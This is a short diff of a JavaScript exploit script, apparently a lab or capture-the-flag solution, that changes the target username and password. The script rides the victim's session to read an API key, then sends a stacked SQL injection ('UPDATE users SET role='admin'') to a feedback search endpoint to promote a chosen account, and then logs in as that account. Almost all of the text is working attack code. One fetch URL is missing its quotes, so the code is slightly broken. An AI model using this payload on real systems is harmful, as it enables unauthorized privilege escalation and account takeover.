@@ -4,7 +4,7 @@ try {
 let meResponse = await fetch('http://web:80/api/me.php', {credentials: 'include'});
 let meData = await meResponse.json();
 let apiKey = meData.api_key;
-let injection = "0; UPDATE users SET role='admin' WHERE username='dev'-- ";
+let injection = "0; UPDATE users SET role='admin' WHERE username='00xCanelo'-- ";
 await fetch(http://web:80/api/search_feedback.php?feedback_id=${encodeURIComponent(injection)}, {
 headers: {
 'X-API-Key': apiKey
@@ -13,8 +13,8 @@ credentials: 'include'
 });
 await fetch('http://web:80/logout.php', {credentials: 'include'});
 let loginData = new URLSearchParams({
-'username': 'dev',
-'password': 'dev_pass'
+'username': '00xCanelo',
+'password': 'Canelo123456'
 });
 await fetch('http://web:80/login.php', {
 method: 'POST',
